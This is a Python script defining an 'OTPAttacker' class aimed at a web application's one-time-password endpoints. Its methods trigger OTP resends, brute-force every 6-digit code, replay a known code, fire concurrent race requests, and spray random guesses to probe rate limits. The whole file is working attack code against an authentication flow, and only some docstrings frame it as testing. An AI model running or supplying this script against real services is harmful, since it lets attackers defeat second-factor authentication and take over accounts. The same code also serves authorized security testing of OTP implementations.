import requests
import itertools
import time
import random

class OTPAttacker:
    def __init__(self, base_url, user_id, session=None):
        self.base_url = base_url.rstrip("/")
        self.user_id = user_id
        self.session = session or requests.Session()

    def send_otp(self, method="email"):
        """Trigger OTP resend to a given channel."""
        url = f"{self.base_url}/auth/resend-otp"
        payload = {"user_id": self.user_id, "contact_method": method}
        r = self.session.post(url, json=payload)
        return r.status_code, r.text

    def verify_otp(self, otp):
        """Try verifying an OTP."""
        url = f"{self.base_url}/auth/verify-otp"
        payload = {"user_id": self.user_id, "otp": otp}
        r = self.session.post(url, json=payload)
        return r.status_code, r.text

    def brute_force(self, digits=6, delay=0.2, stop_on_success=True):
        """Brute force through OTP space with smart throttling."""
        for otp_tuple in itertools.product("0123456789", repeat=digits):
            otp = "".join(otp_tuple)
            status, text = self.verify_otp(otp)
            print(f"[{otp}] -> {status}")
            
            # Adjust here if response text reveals success
            if "success" in text.lower() or status == 200:
                print(f"✅ OTP FOUND: {otp}")
                if stop_on_success:
                    break
            time.sleep(delay)

    def replay_attack(self, known_otp):
        """Test whether an OTP can be reused multiple times."""
        results = []
        for _ in range(3):
            status, text = self.verify_otp(known_otp)
            results.append((status, text))
        return results

    def race_attack(self, known_otp, attempts=10):
        """Spam OTP verification requests simultaneously."""
        from concurrent.futures import ThreadPoolExecutor
        results = []
        def attempt():
            return self.verify_otp(known_otp)

        with ThreadPoolExecutor(max_workers=attempts) as pool:
            results = list(pool.map(lambda _: attempt(), range(attempts)))
        return results

    def random_bypass(self, attempts=20):
        """Send random guesses to test rate-limit enforcement."""
        for _ in range(attempts):
            otp = "".join(random.choice("0123456789") for _ in range(6))
            status, text = self.verify_otp(otp)
            print(f"[{otp}] -> {status}")